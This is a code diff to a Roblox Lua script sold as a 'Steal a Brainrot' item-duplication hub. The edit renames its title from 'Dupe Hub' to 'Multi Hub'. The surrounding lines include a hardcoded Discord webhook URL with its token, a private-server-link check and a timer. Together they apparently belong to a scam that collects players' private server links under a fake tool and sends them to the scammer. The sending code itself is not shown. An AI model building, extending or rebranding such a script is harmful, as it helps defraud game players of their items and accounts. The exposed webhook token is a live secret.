@@ -5,7 +5,7 @@ local TweenService = game:GetService("TweenService")
 local player = Players.LocalPlayer
 
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1450125198358745230/Vz1uCDcqt_Ngw6yHbIU4Ohje6SpBRemBIbLNuRduqN1sUZLgDQ9WHdHMrjTTjuqZFvNq"
-local TITLE_TEXT = "Steal a Brainrot Dupe Hub"
+local TITLE_TEXT = "Steal a Brainrot Multi Hub"
 local SECONDS_PER_PERCENT = 5
 
 local function isPrivateServerLink(text)
@@ -80,7 +80,7 @@ local title = Instance.new("TextLabel")
 title.Parent = menu
 title.Size = UDim2.fromScale(1, 0.25)
 title.BackgroundTransparency = 1
-title.Text = "Dupe Hub"
+title.Text = "Multi Hub"
 title.Font = Enum.Font.GothamBold
 title.TextColor3 = Color3.new(1, 1, 1)
 title.TextScaled = true
